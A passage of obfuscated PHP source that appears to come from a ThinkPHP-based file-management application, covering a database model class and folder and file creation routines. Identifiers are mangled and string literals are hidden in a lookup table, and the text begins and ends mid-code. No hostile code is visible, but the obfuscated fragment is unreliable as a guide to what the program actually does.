default: return $this->check($ùÜ—ñÚ¨[$áëÆ–Ãš[0]], $áëÆ–Ãš[1], $áëÆ–Ãš[4]); } } public function check($Èé¤‹€Ÿ, $‘íÄÙó¸, $šÌíµô… = "\x72\x65\x67\145\170") { $È•ÒŠĞ =& $_SERVER[±³—úê]; $šÌíµô… = strtolower(trim($šÌíµô…)); switch ($šÌíµô…) { case $È•ÒŠĞ[7]: case $È•ÒŠĞ[418]: $ªâêˆÀ— = is_array($‘íÄÙó¸) ? $‘íÄÙó¸ : explode($È•ÒŠĞ[50], $‘íÄÙó¸); return $šÌíµô… == $È•ÒŠĞ[7] ? in_array($Èé¤‹€Ÿ, $ªâêˆÀ—) : !in_array($Èé¤‹€Ÿ, $ªâêˆÀ—); case $È•ÒŠĞ[419]: case $È•ÒŠĞ[420]: if (is_array($‘íÄÙó¸)) { $‘ß¶†˜ı = $‘íÄÙó¸[0]; $÷˜¸†Ø = $‘íÄÙó¸[1]; } else { list($‘ß¶†˜ı, $÷˜¸†Ø) = explode($È•ÒŠĞ[50], $‘íÄÙó¸); } return $šÌíµô… == $È•ÒŠĞ[419] ? $Èé¤‹€Ÿ >= $‘ß¶†˜ı && $Èé¤‹€Ÿ <= $÷˜¸†Ø : $Èé¤‹€Ÿ < $‘ß¶†˜ı || $Èé¤‹€Ÿ > $÷˜¸†Ø; case $È•ÒŠĞ[421]: case $È•ÒŠĞ[422]: return $šÌíµô… == $È•ÒŠĞ[421] ? $Èé¤‹€Ÿ == $‘íÄÙó¸ : $Èé¤‹€Ÿ != $‘íÄÙó¸; case $È•ÒŠĞ[423]: $‰¯µ÷ğğ = mb_strlen($Èé¤‹€Ÿ, $È•ÒŠĞ[424]); if (strpos($‘íÄÙó¸, $È•ÒŠĞ[50])) { list($‘ß¶†˜ı, $÷˜¸†Ø) = explode($È•ÒŠĞ[50], $‘íÄÙó¸); return $‰¯µ÷ğğ >= $‘ß¶†˜ı && $‰¯µ÷ğğ <= $÷˜¸†Ø; } else { return $‰¯µ÷ğğ == $‘íÄÙó¸; } case $È•ÒŠĞ[425]: list($îÏ¹«ëä, $ĞÀûÊæ) = explode($È•ÒŠĞ[50], $‘íÄÙó¸); if (!is_numeric($îÏ¹«ëä)) { $îÏ¹«ëä = strtotime($îÏ¹«ëä); } if (!is_numeric($ĞÀûÊæ)) { $ĞÀûÊæ = strtotime($ĞÀûÊæ); } return NOW_TIME >= $îÏ¹«ëä && NOW_TIME <= $ĞÀûÊæ; case $È•ÒŠĞ[426]: return in_array(get_client_ip(), explode($È•ÒŠĞ[50], $‘íÄÙó¸)); case $È•ÒŠĞ[427]: return !in_array(get_client_ip(), explode($È•ÒŠĞ[50], $‘íÄÙó¸)); case $È•ÒŠĞ[414]: default: return $this->regex($Èé¤‹€Ÿ, $‘íÄÙó¸); } } public function query($éâœ‰ˆ±, $Äã­øç“ = false) { $ö¾°¬Ø =& $_SERVER[±³—úê]; if (!is_bool($Äã­øç“) && !is_array($Äã­øç“)) { $Äã­øç“ = func_get_args(); array_shift($Äã­øç“); } $éâœ‰ˆ± = str_replace(array($ö¾°¬Ø[221], $ö¾°¬Ø[428]), $ö¾°¬Ø[53], $éâœ‰ˆ±); $éâœ‰ˆ± = $this->parseSql($éâœ‰ˆ±, $Äã­øç“); return $this->db->query($éâœ‰ˆ±); } public function execute($¤§ÍŞŠ, $ï®œ•ß = false) { if (!is_bool($ï®œ•ß) && !is_array($ï®œ•ß)) { $ï®œ•ß = func_get_args(); array_shift($ï®œ•ß); } $¤§ÍŞŠ = $this->parseSql($¤§ÍŞŠ, $ï®œ•ß); return $this->db->execute($¤§ÍŞŠ); } protected function parseSql($Ç˜Ê‹€, $ùØ÷¨´€) { $„üËºº³ =& $_SERVER[±³—úê]; if (!0 === $ùØ÷¨´€) { $ñçÈäö = $this->_parseOptions(); $Ç˜Ê‹€ = $this->db->parseSql($Ç˜Ê‹€, $ñçÈäö); } elseif (is_array($ùØ÷¨´€)) { $ùØ÷¨´€ = array_map(array($this->db, $„üËºº³[429]), $ùØ÷¨´€); $Ç˜Ê‹€ = vsprintf($Ç˜Ê‹€, $ùØ÷¨´€); } else { $Ç˜Ê‹€ = strtr($Ç˜Ê‹€, array($„üËºº³[430] => $this->getTableName(), $„üËºº³[431] => think_config($„üËºº³[332]))); } $this->db->setModel($this->name); return $Ç˜Ê‹€; } public function db($ñÖé¢™ = '', $‹‰¼Ì÷ = '', $×ØîŒ‘Ó = array()) { $ƒåÆ‰êÄ =& $_SERVER[±³—úê]; if ($ƒåÆ‰êÄ[12] === $ñÖé¢™ && $this->db) { return $this->db; } static $ğë» ü = array(); static $Äò­åø½ = array(); if (!isset($Äò­åø½[$ñÖé¢™]) || isset($Äò­åø½[$ñÖé¢™]) && $‹‰¼Ì÷ && $ğë» ü[$ñÖé¢™] != $‹‰¼Ì÷) { if (!empty($‹‰¼Ì÷) && is_string($‹‰¼Ì÷) && !1 === strpos($‹‰¼Ì÷, $ƒåÆ‰êÄ[8])) { $‹‰¼Ì÷ = think_config($‹‰¼Ì÷); } $ñÖé¢™ = think_guid($‹‰¼Ì÷); $Äò­åø½[$ñÖé¢™] = Db::getInstance($‹‰¼Ì÷); } elseif (NULL === $‹‰¼Ì÷) { $Äò­åø½[$ñÖé¢™]->close(); unset($Äò­åø½[$ñÖé¢™]); return; } if (!empty($×ØîŒ‘Ó)) { if (is_string($×ØîŒ‘Ó)) { parse_str($×ØîŒ‘Ó, $×ØîŒ‘Ó); } foreach ($×ØîŒ‘Ó as $ĞØ­ßãƒ => $¬“š¨À—) { $this->setProperty($ĞØ­ßãƒ, $¬“š¨À—); } } $ğë» ü[$ñÖé¢™] = $‹‰¼Ì÷; $this->db = $Äò­åø½[$ñÖé¢™]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $È–¾Äøµ = get_class($this); if ($È–¾Äøµ == $_SERVER[±³—úê][432]) { return $this->name; } $this->name = substr($È–¾Äøµ, 0, -5); } return $this->name; } public function getTableName() { $âôàùşâ =& $_SERVER[±³—úê]; if (empty($this->trueTableName)) { $–êíî = !empty($this->tablePrefix) ? $this->tablePrefix : $âôàùşâ[12]; if (!empty($this->tableName)) { $–êíî .= $this->tableName; } else { $–êíî .= think_parse_name($this->name); } $this->trueTableName = strtolower($–êíî); } return (!empty($this->dbName) ? $this->dbName . $âôàùşâ[10] : $âôàùşâ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $´ÆíîÅ =& $_SERVER[±³—úê]; return isset($this->fields[$´ÆíîÅ[339]]) ? $this->fields[$´ÆíîÅ[339]] : $this->pk; } public function getDbFields() { $¦ÑË”Ô =& $_SERVER[±³—úê]; if (isset($this->options[$¦ÑË”Ô[367]])) { $¹³ıí®‹ = $this->db->getFields($this->options[$¦ÑË”Ô[367]]); return $¹³ıí®‹ ? array_keys($¹³ıí®‹) : !1; } if ($this->fields) { $¹³ıí®‹ = $this->fields; unset($¹³ıí®‹[$¦ÑË”Ô[338]], $¹³ıí®‹[$¦ÑË”Ô[339]], $¹³ıí®‹[$¦ÑË”Ô[340]], $¹³ıí®‹[$¦ÑË”Ô[337]]); return $¹³ıí®‹; } return !1; } public function data($¿é¹Æğ§ = '') { $ØóÂŠ´Ö =& $_SERVER[±³—úê]; if ($ØóÂŠ´Ö[12] === $¿é¹Æğ§ && !empty($this->data)) { return $this->data; } if (is_object($¿é¹Æğ§)) { $¿é¹Æğ§ = get_object_vars($¿é¹Æğ§); } elseif (is_string($¿é¹Æğ§)) { parse_str($¿é¹Æğ§, $¿é¹Æğ§); } elseif (!is_array($¿é¹Æğ§)) { think_exception(think_lang($ØóÂŠ´Ö[359])); } $this->data = $¿é¹Æğ§; return $this; } public function join($’ ‘˜ÌÆ) { $ÌøŞ÷¶› =& $_SERVER[±³—úê]; if (is_array($’ ‘˜ÌÆ)) { $this->options[$ÌøŞ÷¶›[370]] = $’ ‘˜ÌÆ; } elseif (!empty($’ ‘˜ÌÆ)) { $this->options[$ÌøŞ÷¶›[370]][] = $’ ‘˜ÌÆ; } return $this; } public function union($¤“³ªç, $”œïÓà“ = false) { $ü¼©öå =& $_SERVER[±³—úê]; if (empty($¤“³ªç)) { return $this; } if ($”œïÓà“) { $this->options[$ü¼©öå[433]][$ü¼©öå[434]] = !0; } if (is_object($¤“³ªç)) { $¤“³ªç = get_object_vars($¤“³ªç); } if (is_string($¤“³ªç)) { $ËˆˆàÏ = $¤“³ªç; } elseif (is_array($¤“³ªç)) { if (isset($¤“³ªç[0])) { $this->options[$ü¼©öå[433]] = array_merge($this->options[$ü¼©öå[433]], $¤“³ªç); return $this; } else { $ËˆˆàÏ = $¤“³ªç; } } else { think_exception(think_lang($ü¼©öå[359])); } $this->options[$ü¼©öå[433]][] = $ËˆˆàÏ; return $this; } public function cache($¸ºª½‚² = true, $àäàÖø = null, $¨ÌÊÓÛ— = '') { $ÛÜàô§¶ =& $_SERVER[±³—úê]; if (!1 !== $¸ºª½‚²) { $this->options[$ÛÜàô§¶[435]] = array($ÛÜàô§¶[97] => $¸ºª½‚², $ÛÜàô§¶[425] => $àäàÖø, $ÛÜàô§¶[33] => $¨ÌÊÓÛ—); } return $this; } public function field($òÚÈÆÂá, $±ûšú¯ú = false) { $´ïß¤‡ =& $_SERVER[±³—úê]; if (!0 === $òÚÈÆÂá) { $àöŒÔ¨ = $this->getDbFields(); $òÚÈÆÂá = $àöŒÔ¨ ? $àöŒÔ¨ : $´ïß¤‡[232]; } elseif ($±ûšú¯ú) { if (is_string($òÚÈÆÂá)) { $òÚÈÆÂá = explode($´ïß¤‡[50], $òÚÈÆÂá); } $àöŒÔ¨ = $this->getDbFields(); $òÚÈÆÂá = $àöŒÔ¨ ? array_diff($àöŒÔ¨, $òÚÈÆÂá) : $òÚÈÆÂá; } $this->options[$´ïß¤‡[361]] = $òÚÈÆÂá; return $this; } public function scope($ŒŞì½±ç = '', $âÖ¿…ˆÓ = NULL) { $û÷Ù€È‹ =& $_SERVER[±³—úê]; if ($û÷Ù€È‹[12] === $ŒŞì½±ç) { if (isset($this->_scope[$û÷Ù€È‹[37]])) { $ÎüŞ·¥† = $this->_scope[$û÷Ù€È‹[37]]; } else { return $this; } } elseif (is_string($ŒŞì½±ç)) { $Ÿó×Á’¦ = explode($û÷Ù€È‹[50], $ŒŞì½±ç); $ÎüŞ·¥† = array(); foreach ($Ÿó×Á’¦ as $‰…¹ÊÎ ) { if (!isset($this->_scope[$‰…¹ÊÎ ])) { continue; } $ÎüŞ·¥† = array_merge($ÎüŞ·¥†, $this->_scope[$‰…¹ÊÎ ]); } if (!empty($âÖ¿…ˆÓ) && is_array($âÖ¿…ˆÓ)) { $ÎüŞ·¥† = array_merge($ÎüŞ·¥†, $âÖ¿…ˆÓ); } } elseif (is_array($ŒŞì½±ç)) { $ÎüŞ·¥† = $ŒŞì½±ç; } if (is_array($ÎüŞ·¥†) && !empty($ÎüŞ·¥†)) { $this->options = array_merge($this->options, array_change_key_case($ÎüŞ·¥†)); } return $this; } public function where($şÙ¨šºˆ, $öçòÈÅŒ = null) { $äò€¯©£ =& $_SERVER[±³—úê]; if (!is_null($öçòÈÅŒ) && is_string($şÙ¨šºˆ)) { if (!is_array($öçòÈÅŒ)) { $öçòÈÅŒ = func_get_args(); array_shift($öçòÈÅŒ); } $öçòÈÅŒ = array_map(array($this->db, $äò€¯©£[429]), $öçòÈÅŒ); $şÙ¨šºˆ = vsprintf($şÙ¨šºˆ, $öçòÈÅŒ); } elseif (is_object($şÙ¨šºˆ)) { $şÙ¨šºˆ = get_object_vars($şÙ¨šºˆ); } elseif (is_array($şÙ¨šºˆ)) { foreach ($şÙ¨šºˆ as $±¿Ï´§ñ => $ĞÌ‘¦ø¡) { if ((is_numeric($±¿Ï´§ñ) || !$±¿Ï´§ñ) && is_string($ĞÌ‘¦ø¡)) { if (strpos($ĞÌ‘¦ø¡, $äò€¯©£[436]) === 0) { continue; } think_trace($äò€¯©£[437], $äò€¯©£[12], $äò€¯©£[49]); die; } } } if (is_string($şÙ¨šºˆ) && $äò€¯©£[12] != $şÙ¨šºˆ) { $¡½¶Â´â = array(); $¡½¶Â´â[$äò€¯©£[438]] = $şÙ¨šºˆ; $şÙ¨šºˆ = $¡½¶Â´â; } if (isset($this->options[$äò€¯©£[363]])) { $this->options[$äò€¯©£[363]] = array_merge($this->options[$äò€¯©£[363]], $şÙ¨šºˆ); } else { $this->options[$äò€¯©£[363]] = $şÙ¨šºˆ; } return $this; } public function limit($İÓöêŞÀ, $½ñƒ×Î‰ = null) { $§Ÿêìí‘ =& $_SERVER[±³—úê]; $this->options[$§Ÿêìí‘[378]] = is_null($½ñƒ×Î‰) ? $İÓöêŞÀ : $İÓöêŞÀ . $§Ÿêìí‘[50] . $½ñƒ×Î‰; return $this; } public function page($°ü¦¢š, $¤ø³ŒÆª = null) { $şèñ¢ø˜ =& $_SERVER[±³—úê]; $this->options[$şèñ¢ø˜[439]] = is_null($¤ø³ŒÆª) ? $°ü¦¢š : $°ü¦¢š . $şèñ¢ø˜[50] . $¤ø³ŒÆª; return $this; } public function comment($Éƒ·Ç–Ö) { $this->options[$_SERVER[±³—úê][440]] = $Éƒ·Ç–Ö; return $this; } public function setProperty($ªò•›ÍÍ, $Ç¤°ÀĞÉ) { if (property_exists($this, $ªò•›ÍÍ)) { $this->{$ªò•›ÍÍ} = $Ç¤°ÀĞÉ; } return $this; } } goto A®Ö¹©¡è; B–Â˜ø‘§: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Äò¹˜ƒù) { $Ÿ …Íç‚ =& $_SERVER[±³—úê]; $¨Àó…ñ = Model($Ÿ …Íç‚[588])->where(array($Ÿ …Íç‚[1766] => $Äò¹˜ƒù))->find(); $Ñ§Í‘ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Äò¹˜ƒù, $¨Àó…ñ[$Ÿ …Íç‚[32]]); $this->userDesktopAdd($Ñ§Í‘); return $Ñ§Í‘; } public function userDesktopAdd($‹Á«©‚) { $”°Ï×Êì =& $_SERVER[±³—úê]; $¸È®³³ì = LNG($”°Ï×Êì[2256]); $…ÎÏ˜ë = $this->mkdir($‹Á«©‚, $¸È®³³ì); $this->metaSet($…ÎÏ˜ë, $”°Ï×Êì[2257], $”°Ï×Êì[91]); $this->metaSet($‹Á«©‚, $”°Ï×Êì[2258], $…ÎÏ˜ë); } public function userPathSafeAdd($™çªŠàê) { $Ä€âùÌ¨ =& $_SERVER[±³—úê]; $›à¬’£ = Model($Ä€âùÌ¨[588])->getInfoFull($™çªŠàê); if (!$›à¬’£) { return !1; } if (_get($›à¬’£, $Ä€âùÌ¨[609])) { return $›à¬’£[$Ä€âùÌ¨[550]][$Ä€âùÌ¨[2259]]; } $ãÃæó– = $this->_mkdirRoot(SourceModel::TYPE_USER, $™çªŠàê, $Ä€âùÌ¨[2260], $Ä€âùÌ¨[2261]); Model($Ä€âùÌ¨[588])->metaSet($™çªŠàê, $Ä€âùÌ¨[2259], $ãÃæó–); $this->metaSet($ãÃæó–, $Ä€âùÌ¨[2262], $™çªŠàê); return $ãÃæó–; } public function userPathAppAdd($ààû‹èÔ, $•Û—²Ïï = '', $›õâëêÄ = '') { $Ò´åìĞ =& $_SERVER[±³—úê]; $œ³à›ƒÇ = Model($Ò´åìĞ[588])->getInfoFull($ààû‹èÔ); if (!$œ³à›ƒÇ) { return !1; } $İ¨Òíªƒ = $œ³à›ƒÇ[$Ò´åìĞ[550]] ? $œ³à›ƒÇ[$Ò´åìĞ[550]] : array(); $“ùí‡íå = $İ¨Òíªƒ[$Ò´åìĞ[2263]]; if (!$“ùí‡íå) { $“ùí‡íå = $this->_mkdirRoot(SourceModel::TYPE_USER, $ààû‹èÔ, $Ò´åìĞ[2264], $Ò´åìĞ[2265]); Model($Ò´åìĞ[588])->metaSet($ààû‹èÔ, $Ò´åìĞ[2263], $“ùí‡íå . $Ò´åìĞ[12]); $this->metaSet($“ùí‡íå, $Ò´åìĞ[2263], $ààû‹èÔ); } if (!$•Û—²Ïï) { return $“ùí‡íå; } $ĞÑ÷È« = $İ¨Òíªƒ[$Ò´åìĞ[2266] . $•Û—²Ïï]; if (!$ĞÑ÷È«) { $ĞÑ÷È« = $this->mkdir($“ùí‡íå, $•Û—²Ïï); Model($Ò´åìĞ[588])->metaSet($ààû‹èÔ, $Ò´åìĞ[2266] . $•Û—²Ïï, $ĞÑ÷È«); $this->metaSet($ĞÑ÷È«, $Ò´åìĞ[2266] . $•Û—²Ïï, $ààû‹èÔ); } if (!$›õâëêÄ) { return $ĞÑ÷È«; } $¢–¬¹ = $this->mkdir($ĞÑ÷È«, $›õâëêÄ); return $¢–¬¹; } public function groupRootAdd($ºÄŸˆö) { $¯ °ğ»º =& $_SERVER[±³—úê]; $šßØ› ÷ = Model($¯ °ğ»º[596])->where(array($¯ °ğ»º[2067] => $ºÄŸˆö))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ºÄŸˆö, $šßØ› ÷[$¯ °ğ»º[32]]); } public function systemRootPathAdd($èŠ•‘ŒÌ) { if ($èŠ•‘ŒÌ != $_SERVER[±³—úê][619]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $èŠ•‘ŒÌ); } public function userRootRemove($Ù¶µíî“) { $­³ú» = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ù¶µíî“, !0); foreach ($­³ú» as $ùù¢è©ñ) { if (!$ùù¢è©ñ) { continue; } $this->remove($ùù¢è©ñ[$_SERVER[±³—úê][193]], !1); } } public function groupRootRemove($£ìÆÓ) { $´üÙ’é = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $£ìÆÓ); if (!$´üÙ’é) { return; } $this->remove($´üÙ’é[$_SERVER[±³—úê][193]], !1); } private function _mkdirRoot($Ë•Æ»ÎÛ, $ô­úÚù, $Ë¨¤–Ù–, $æê¹ïî = '') { $­¬§•ü´ =& $_SERVER[±³—úê]; $ÍöÊ¿÷Ù = defined($­¬§•ü´[2202]) ? USER_ID : 0; $¢Œ¸Åê = array($­¬§•ü´[488] => 0, $­¬§•ü´[662] => $Ë•Æ»ÎÛ, $­¬§•ü´[663] => $ô­úÚù, $­¬§•ü´[660] => 1, $­¬§•ü´[664] => $ÍöÊ¿÷Ù, $­¬§•ü´[665] => $ÍöÊ¿÷Ù, $­¬§•ü´[661] => $æê¹ïî, $­¬§•ü´[666] => $­¬§•ü´[604], $­¬§•ü´[515] => 0, $­¬§•ü´[631] => 0, $­¬§•ü´[553] => 0, $­¬§•ü´[667] => $­¬§•ü´[12]); if ($°î”¼ˆâ = $this->where($¢Œ¸Åê)->find()) { return $°î”¼ˆâ[$­¬§•ü´[193]]; } $«²ï÷Å‹ = "\x4d\x6f\144\145\x6c\123\157\x75\162\x63\145\56\155\153\x64\x69\x72\x52\x6f\x6f\x74\56{$Ë•Æ»ÎÛ}\x2e{$ô­úÚù}\56" . $Ë¨¤–Ù–; CacheLock::lock($«²ï÷Å‹); $¢Œ¸Åê[$­¬§•ü´[32]] = $Ë¨¤–Ù–; $˜ôÀóŞÌ = $this->add($¢Œ¸Åê); $÷šĞ‡Õ® = array($­¬§•ü´[668] => short_id($˜ôÀóŞÌ)); $this->where(array($­¬§•ü´[502] => $˜ôÀóŞÌ))->save($÷šĞ‡Õ®); CacheLock::unlock($«²ï÷Å‹); return $˜ôÀóŞÌ; } private function targetSourceRoot($†Ø‚¯öÆ, $¹æ·º”—, $–šâÆñ = false) { $Ş”˜Çà… =& $_SERVER[±³—úê]; $Ù—¿¼ş¶ = array($Ş”˜Çà…[488] => 0, $Ş”˜Çà…[662] => $†Ø‚¯öÆ, $Ş”˜Çà…[663] => $¹æ·º”—); if ($–šâÆñ) { $Òã·ê¶¡ = $this->where($Ù—¿¼ş¶)->select(); return $Òã·ê¶¡ ? $Òã·ê¶¡ : array(); } $¥ó¹Óøä = $this->where($Ù—¿¼ş¶)->find(); return $¥ó¹Óøä ? $¥ó¹Óøä : array(); } public function sourceRootGroup($ úˆ—Î®) { $‚şÌ ŠÕ =& $_SERVER[±³—úê]; if (is_string($ úˆ—Î®)) { $ úˆ—Î® = array($ úˆ—Î®); } $‘Ü®²ø„ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ úˆ—Î®, $‚şÌ ŠÕ[232]); $ªÕè·® = array($‚şÌ ŠÕ[456] => $‘Ü®²ø„, $‚şÌ ŠÕ[453] => array($‚şÌ ŠÕ[838] => count($ úˆ—Î®))); $this->_listDataApply($ªÕè·®[$‚şÌ ŠÕ[456]]); $this->_listMake($ªÕè·®); return array_to_keyvalue($ªÕè·®[$‚şÌ ŠÕ[85]], $‚şÌ ŠÕ[580]); } public function mkfile($¿Ö¥ø…, $£ùêÀÓ, $šá¾ÚŸ = '', $£Ã‚«» = REPEAT_RENAME) { $Ôô÷Åü =& $_SERVER[±³—úê]; $ó‹Ş°£é = Model($Ôô÷Åü[688])->addFileByContent($šá¾ÚŸ, $£ùêÀÓ); return $this->_createFileCall($¿Ö¥ø…, $£ùêÀÓ, $ó‹Ş°£é, $£Ã‚«», $Ôô÷Åü[1433]); } public function addFile($ÙÏƒœ÷„, $²ìÑÃ®Ç, $ëŒ·óÛ, $ÜÑÂ¨Ù™ = false, $Ï’¢Ç£¯ = REPEAT_RENAME) { $æã©Â‰¼ = Model($_SERVER[±³—úê][688])->addFile($²ìÑÃ®Ç, $ëŒ·óÛ, $ÜÑÂ¨Ù™); return $this->_createFileCall($ÙÏƒœ÷„, $ëŒ·óÛ, $æã©Â‰¼, $Ï’¢Ç£¯); } public function addFileByFileID($’êšÅø…, $Â›éıá, $Ñè€Çé, $à“Çé÷¬ = REPEAT_RENAME) { $÷Ó…ãÇ³ =& $_SERVER[±³—úê]; $ÓĞ„ù·Ä = Model($÷Ó…ãÇ³[688])->find($Â›éıá); Model($÷Ó…ãÇ³[688])->linkAdd($Â›éıá); return $this->_createFileCall($’êšÅø…, $Ñè€Çé, $ÓĞ„ù·Ä, $à“Çé÷¬); } public function addFileByRemote($ˆäíò­š, $Íî¢£í®, $©¿¿Ë¬ , $´¢ÛØù£ = array(), $âáÑ³¬Ñ = REPEAT_RENAME) { $şì´ËÍù = Model($_SERVER[±³—úê][688])->addFileByRemote($Íî¢£í®, $©¿¿Ë¬ , $´¢ÛØù£); return $this->_createFileCall($ˆäíò­š, $©¿¿Ë¬ , $şì´ËÍù, $âáÑ³¬Ñ); } private function _createFileCall($ÔÍ•Éçá, $òÌøøµ«, $„Ø§––À, $÷¯í¾éš, $Ü›µ±‹Š = "\165\160\x6c\157\141\x64") { $”¿‡–Ì£ =& $_SERVER[±³—úê]; $Ú¸¬ğ¨ = !1; $this->setMasterDB(); $this->lockWriteStart($ÔÍ•Éçá, $òÌøøµ«); $‚ÀÎ¬Úì = $this->fileNameExist($ÔÍ•Éçá, $òÌøøµ«); $„¯ÒÚÏì = $this->_createFile($ÔÍ•Éçá, $òÌøøµ«, $„Ø§––À, $÷¯í¾éš, $Ú¸¬ğ¨); if (!$Ú¸¬ğ¨) { Model($”¿‡–Ì£[555])->remove($„Ø§––À[$”¿‡–Ì£[552]]); } if ($Ú¸¬ğ¨ && $„¯ÒÚÏì && $„¯ÒÚÏì != $‚ÀÎ¬Úì) { Model($”¿‡–Ì£[2229])->eventCreate($„¯ÒÚÏì, $Ü›µ±‹Š); } $this->lockWriteEnd($ÔÍ•Éçá, $òÌøøµ«); return $„¯ÒÚÏì; } public function mkdir($Ô¡èÍÇØ, $‚ò«Åş, $ÇÓÁş”Î = REPEAT_SKIP) { $òÇ§°ÍÊ =& $_SERVER[±³—úê]; $this->setMasterDB(); $¾—ÅÛÛ = $this->sourceInfo($Ô¡èÍÇØ); if (!$¾—ÅÛÛ) { return !1; } $this->lockWriteStart($Ô¡èÍÇØ, $‚ò«Åş); if ($ÇÓÁş”Î !== !1) { $Ä°Ü€·Æ = $this->fileNameExist($Ô¡èÍÇØ, $‚ò«Åş); if ($Ä°Ü€·Æ && $ÇÓÁş”Î != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ô¡èÍÇØ, $‚ò«Åş); return $Ä°Ü€·Æ; } $‚ò«Åş = $this->fileNameAuto($Ô¡èÍÇØ, $‚ò«Åş, $ÇÓÁş”Î); } $™Û¿Òû¥ = array($òÇ§°ÍÊ[660] => 1, $òÇ§°ÍÊ[505] => $‚ò«Åş, $òÇ§°ÍÊ[661] => $òÇ§°ÍÊ[12], $òÇ§°ÍÊ[553] => 0, $òÇ§°ÍÊ[631] => 0); $÷ı¡½Ú£ = $this->_addSource($™Û¿Òû¥, $¾—ÅÛÛ); Model($òÇ§°ÍÊ[2229])->eventCreate($÷ı¡½Ú£, $òÇ§°ÍÊ[1434]); $this->lockWriteEnd($Ô¡èÍÇØ, $‚ò«Åş); return $÷ı¡½Ú£; } public function listSourceRoot($¥¤½ÉÀô, $¨èß²ª¨, $œ¸ñ‚£» = "\163\x6f\165\x72\x63\x65\x49\104\x2c\x74\141\x72\x67\145\x74\x49\x44\x2c\x73\151\x7a\x65") { $ÆÑâ²® =& $_SERVER[±³—úê]; $¢ÖŒ½¹ = $ÆÑâ²®[465]; $Öó÷Åà“ = array(); $ÃË‡á = 1024 * 50; $ãõ‚ ôè = is_array($ãõ‚ ôè) ? $ãõ‚ ôè : array(); $ÂöÂÖÍŒ = count($¨èß²ª¨); $İ‚æé›ä = $this->tablePrefix . $ÆÑâ²®[2267]; for ($À¥şâÃ = 0; $À¥şâÃ < $ÂöÂÖÍŒ; $À¥şâÃ++) { $’²¢¤øä = $¨èß²ª¨[$À¥şâÃ]; $¢ÖŒ½¹ .= "\x53\105\x4c\105\103\124\40\52\40\106\122\x4f\x4d\40\x28\123\105\x4c\105\x43\124\40{$œ¸ñ‚£»}\40\106\x52\117\x4d\x20\x60{$İ‚æé›ä}\x60\40\x57\110\105\x52\105\40"; $¢ÖŒ½¹ .= "\140\160\x61\x72\145\156\164\111\104\x60\75\60\x20\x41\116\x44\40\x60\164\x61\162\147\145\164\x49\x44\x60\75{$’²¢¤øä}\40\x41\x4e\104\40\x60\x74\141\162\147\145\164\x54\171\x70\x65\x60\75{$¥¤½ÉÀô}\x20\141\156\x64\40\146\x69\154\145\124\171\x70\x65\75\x27\x27\x20\154\x69\x6d\151\x74\40\61\x29\40\x61\x73\40\x74\x62\x5f{$À¥şâÃ}\x20\x55\x4e\111\117\x4e\x20\101\x4c\114\40"; if ((strlen($¢ÖŒ½¹) >= $ÃË‡á || $À¥şâÃ == $ÂöÂÖÍŒ - 1) && $¢ÖŒ½¹) { $¢ÖŒ½¹ = substr($¢ÖŒ½¹, 0, -strlen($ÆÑâ²®[1117])); $Ëí§©ê¶ = $this->query($¢ÖŒ½¹); $¢ÖŒ½¹ = $ÆÑâ²®[12]; $Öó÷Åà“ = array_merge($Öó÷Åà“, $Ëí§©ê¶); } } return $Öó÷Åà“; } private function _createFile($ÄºáøÀš, $°³û¸ä, $¢Şª™ó«, $‰„Ï¼½ª, &$îú¨Å£Ş) { $ÀàÜİÍ =& $_SERVER[±³—úê]; $˜ ±¦à­ = $this->sourceInfo($ÄºáøÀš); if (!$¢Şª™ó« || !$˜ ±¦à­) { return !1; } if ($‰„Ï¼½ª !== !1) { $şĞŒ‹§› = $this->fileNameExist($ÄºáøÀš, $°³û¸ä); } $îú¨Å£Ş = !0; if ($‰„Ï¼½ª && $şĞŒ‹§›) { if ($‰„Ï¼½ª == REPEAT_SKIP) { $îú¨Å£Ş = !1; return $şĞŒ‹§›; } else { if ($‰„Ï¼½ª == REPEAT_REPLACE) { $€ş©üæ = $this->sourceInfo($şĞŒ‹§›); $”€ÀÖ˜€ = $this->fileHistory($€ş©üæ, $¢Şª™ó«[$ÀàÜİÍ[552]], $¢Şª™ó«[$ÀàÜİÍ[79]]); if (!$”€ÀÖ˜€) { $îú¨Å£Ş = !1; } else { $this->folderSizeReset($ÄºáøÀš); } return $şĞŒ‹§›; } else { $°³û¸ä = $this->fileNameAuto($ÄºáøÀš, $°³û¸ä, $‰„Ï¼½ª, !1); } } } $È¶åèñº = array($ÀàÜİÍ[660] => 0, $ÀàÜİÍ[505] => $°³û¸ä, $ÀàÜİÍ[661] => substr(get_path_ext($°³û¸ä), 0, 10), $ÀàÜİÍ[553] => $¢Şª™ó«[$ÀàÜİÍ[552]], $ÀàÜİÍ[631] => $¢Şª™ó«[$ÀàÜİÍ[79]]); $ª–ıÑ“Ö = $this->_addSource($È¶åèñº, $˜ ±¦à­); $this->folderSizeReset($ÄºáøÀš, intval($È¶åèñº[$ÀàÜİÍ[79]])); return $ª–ıÑ“Ö; } protected function fileHistory($‹á¦¢û, $ªúèï—, $ÓÄ°ğ) { $”ÙÚ×ê¿ =& $_SERVER[±³—úê]; if ($‹á¦¢û[$”ÙÚ×ê¿[552]] == $ªúèï—) { return !1; } $this->checkLock($‹á¦¢û[$”ÙÚ×ê¿[193]], $ªúèï—); Model($”ÙÚ×ê¿[2268])->addHistory($‹á¦¢û); $İ¼Ëí»õ = array($”ÙÚ×ê¿[665] => USER_ID, $”ÙÚ×ê¿[509] => time(), $”ÙÚ×ê¿[552] => $ªúèï—, $”ÙÚ×ê¿[79] => $ÓÄ°ğ); $this->where(array($”ÙÚ×ê¿[502] => 